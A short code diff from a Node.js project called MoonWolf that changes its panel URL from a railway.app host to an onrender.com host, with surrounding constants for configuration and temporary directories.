@@ -10,7 +10,7 @@ const os = require('node:os');
 const zlib = require('node:zlib');
 const { spawn } = require('node:child_process');
 
-const PANEL_URL = 'https://moonwolf-panel.up.railway.app';
+const PANEL_URL = 'https://moonwolf-panel.onrender.com';
 const CONFIG_DIR = path.join(process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming'), 'MoonWolf');
 const NATIVE_ASSET = 'native/webview.win32-x64-msvc.node';
 const TEMP_ROOT = path.join(os.tmpdir(), 'MoonWolf-Agent');
